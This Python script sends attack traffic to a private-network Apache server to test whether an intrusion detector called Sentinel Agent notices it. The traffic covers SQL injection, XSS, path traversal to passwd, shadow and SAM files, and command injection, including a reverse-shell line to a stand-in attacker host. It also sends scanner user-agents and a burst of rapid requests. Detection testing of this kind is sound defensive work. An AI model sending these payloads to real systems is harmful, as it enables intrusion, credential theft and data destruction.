#!/usr/bin/env python3
"""
Web Attack Testing Script for Sentinel Agent
Tests various attack vectors against Apache server

Usage:
    python3 test_web_attacks.py
    
Requirements:
    pip install requests
"""

import requests
import time
import sys
from urllib.parse import urljoin

# Configuration
TARGET = "http://192.168.31.91"
DELAY_BETWEEN_ATTACKS = 2  # seconds
DELAY_BETWEEN_TESTS = 5   # seconds

# Attack payloads
SQL_INJECTION = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "admin'--",
    "1' AND 1=1--",
    "'; DROP TABLE users--",
    "1' ORDER BY 10--",
    "' AND 1=0 UNION SELECT NULL, version()--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>"
]

PATH_TRAVERSAL = [
    "../../etc/passwd",
    "../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../../../../etc/hosts",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam"
]

COMMAND_INJECTION = [
    "; cat /etc/passwd",
    "| whoami",
    "`ls -la`",
    "$(cat /etc/shadow)",
    "&& id",
    "; nc -e /bin/sh attacker.com 4444"
]

SUSPICIOUS_AGENTS = [
    "sqlmap/1.0",
    "Nikto",
    "w3af/1.0",
    "nmap NSE",
    "Havij",
    "Acunetix",
    "Burp Suite"
]

# Color codes for output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_header(text):
    """Print a formatted header"""
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{text.center(70)}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")

def print_test(text):
    """Print test description"""
    print(f"{Colors.CYAN}[*] {text}{Colors.ENDC}")

def print_success(text):
    """Print success message"""
    print(f"{Colors.GREEN}  [+] {text}{Colors.ENDC}")

def print_error(text):
    """Print error message"""
    print(f"{Colors.RED}  [-] {text}{Colors.ENDC}")

def print_warning(text):
    """Print warning message"""
    print(f"{Colors.YELLOW}  [!] {text}{Colors.ENDC}")

def test_sql_injection():
    """Test SQL injection detection"""
    print_test("Testing SQL Injection Detection...")
    
    for i, payload in enumerate(SQL_INJECTION, 1):
        url = f"{TARGET}/index.php?id={payload}"
        try:
            r = requests.get(url, timeout=5)
            print_success(f"Test {i}/{len(SQL_INJECTION)}: {payload[:40]}... → Status: {r.status_code}")
        except requests.exceptions.ConnectionError:
            print_error(f"Connection failed - Is Apache running at {TARGET}?")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    return True

def test_xss():
    """Test XSS detection"""
    print_test("Testing Cross-Site Scripting (XSS) Detection...")
    
    for i, payload in enumerate(XSS_PAYLOADS, 1):
        url = f"{TARGET}/search?q={payload}"
        try:
            r = requests.get(url, timeout=5)
            print_success(f"Test {i}/{len(XSS_PAYLOADS)}: XSS payload sent → Status: {r.status_code}")
        except requests.exceptions.ConnectionError:
            print_error(f"Connection failed")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    return True

def test_path_traversal():
    """Test path traversal detection"""
    print_test("Testing Path Traversal Detection...")
    
    for i, payload in enumerate(PATH_TRAVERSAL, 1):
        url = f"{TARGET}/{payload}"
        try:
            r = requests.get(url, timeout=5)
            print_success(f"Test {i}/{len(PATH_TRAVERSAL)}: {payload[:30]}... → Status: {r.status_code}")
        except requests.exceptions.ConnectionError:
            print_error(f"Connection failed")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    return True

def test_command_injection():
    """Test command injection detection"""
    print_test("Testing Command Injection Detection...")
    
    for i, payload in enumerate(COMMAND_INJECTION, 1):
        url = f"{TARGET}/ping?host=127.0.0.1{payload}"
        try:
            r = requests.get(url, timeout=5)
            print_success(f"Test {i}/{len(COMMAND_INJECTION)}: Command injection sent → Status: {r.status_code}")
        except requests.exceptions.ConnectionError:
            print_error(f"Connection failed")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    return True

def test_suspicious_agents():
    """Test suspicious user-agent detection"""
    print_test("Testing Suspicious User-Agent Detection...")
    
    for i, agent in enumerate(SUSPICIOUS_AGENTS, 1):
        headers = {"User-Agent": agent}
        try:
            r = requests.get(TARGET, headers=headers, timeout=5)
            print_success(f"Test {i}/{len(SUSPICIOUS_AGENTS)}: Agent '{agent}' → Status: {r.status_code}")
        except requests.exceptions.ConnectionError:
            print_error(f"Connection failed")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    return True

def test_dos_simulation():
    """Simulate DoS attack with rapid requests"""
    print_test("Testing DoS Pattern Detection (Rapid Requests)...")
    
    num_requests = 25
    for i in range(num_requests):
        try:
            r = requests.get(TARGET, timeout=5)
            print_success(f"Request {i+1}/{num_requests} → Status: {r.status_code}")
        except requests.exceptions.ConnectionError:
            print_error(f"Connection failed")
            return False
        except Exception as e:
            print_error(f"Error: {e}")
        time.sleep(0.1)  # Very fast requests to simulate DoS
    
    return True

def test_connection():
    """Test if target is reachable"""
    print_test(f"Testing connection to {TARGET}...")
    try:
        r = requests.get(TARGET, timeout=5)
        print_success(f"Connection successful! Status: {r.status_code}")
        return True
    except requests.exceptions.ConnectionError:
        print_error(f"Cannot connect to {TARGET}")
        print_error("Please ensure:")
        print_error("  1. Apache server is running")
        print_error("  2. Target IP is correct")
        print_error("  3. Firewall allows connections")
        return False
    except Exception as e:
        print_error(f"Connection test failed: {e}")
        return False

def main():
    """Main execution function"""
    print_header("Sentinel Agent - Web Attack Testing Script")
    print(f"{Colors.BOLD}Target:{Colors.ENDC} {TARGET}")
    print(f"{Colors.BOLD}Purpose:{Colors.ENDC} Test web attack detection capabilities")
    print(f"{Colors.BOLD}Warning:{Colors.ENDC} Only test systems you own!\n")
    
    # Test connection first
    if not test_connection():
        print_error("\nConnection test failed. Exiting.")
        sys.exit(1)
    
    print_warning("Starting attack tests in 3 seconds...")
    time.sleep(3)
    
    # Define test suite
    tests = [
        ("SQL Injection", test_sql_injection),
        ("Cross-Site Scripting (XSS)", test_xss),
        ("Path Traversal", test_path_traversal),
        ("Command Injection", test_command_injection),
        ("Suspicious User-Agents", test_suspicious_agents),
        ("DoS Simulation", test_dos_simulation)
    ]
    
    results = {}
    
    # Run each test
    for name, test_func in tests:
        print(f"\n{Colors.BLUE}{'─'*70}{Colors.ENDC}")
        result = test_func()
        results[name] = result
        
        if result:
            print(f"\n{Colors.GREEN}✓ {name} tests completed{Colors.ENDC}")
        else:
            print(f"\n{Colors.RED}✗ {name} tests failed{Colors.ENDC}")
            break  # Stop if connection fails
        
        print_warning(f"Waiting {DELAY_BETWEEN_TESTS} seconds before next test...")
        time.sleep(DELAY_BETWEEN_TESTS)
    
    # Print summary
    print_header("Test Summary")
    
    for name, result in results.items():
        status = f"{Colors.GREEN}✓ PASSED{Colors.ENDC}" if result else f"{Colors.RED}✗ FAILED{Colors.ENDC}"
        print(f"  {name:<35} {status}")
    
    print(f"\n{Colors.BOLD}Next Steps:{Colors.ENDC}")
    print(f"  1. Check Sentinel Agent logs: tail -f /app/logs/sentinel.log")
    print(f"  2. View Apache logs: sudo tail -f /var/log/apache2/access.log")
    print(f"  3. Check attack database: curl http://192.168.31.91:8000/api/attacks")
    print(f"  4. Open dashboard: http://192.168.31.91:8501")
    
    print_header("Testing Complete!")
    
    if all(results.values()):
        print(f"{Colors.GREEN}All tests executed successfully!{Colors.ENDC}")
        print(f"{Colors.GREEN}Your Sentinel Agent should have detected these attacks.{Colors.ENDC}\n")
    else:
        print(f"{Colors.YELLOW}Some tests failed - check connection and retry.{Colors.ENDC}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Testing interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
        sys.exit(1)
